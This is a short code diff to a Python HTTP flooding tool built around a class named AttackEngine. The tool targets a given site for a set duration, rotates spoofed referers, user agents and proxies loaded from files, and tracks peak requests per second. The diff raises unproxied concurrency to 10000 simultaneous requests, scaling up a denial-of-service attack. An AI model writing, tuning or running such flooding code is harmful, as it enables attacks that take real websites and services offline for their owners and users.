@@ -6,7 +6,12 @@ import aiohttp
 import httpx
 from random import choice
 
-# Load lines from file
+# === SETTINGS ===
+NO_PROXY_CONCURRENCY = 10000
+PROXY_CONCURRENCY = 50
+REQUEST_TIMEOUT = 10
+
+# === Load lines ===
 def load_lines(file):
     try:
         with open(file, "r") as f:
@@ -18,8 +23,6 @@ REFERERS = load_lines("refs.txt")
 USER_AGENTS = load_lines("uas.txt")
 PROXIES = load_lines("STS.txt")
 
-REQUEST_TIMEOUT = 10
-
 class AttackEngine:
     def __init__(self, target, duration, use_proxies):
         self.target = target
@@ -27,7 +30,7 @@ class AttackEngine:
         self.use_proxies = use_proxies
         self.start_time = time.time()
         self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
-        self.max_concurrent = 50 if self.use_proxies else 1000
+        self.max_concurrent = PROXY_CONCURRENCY if use_proxies else NO_PROXY_CONCURRENCY
         self.proxy_index = 0
 
     def update_stats(self, results):
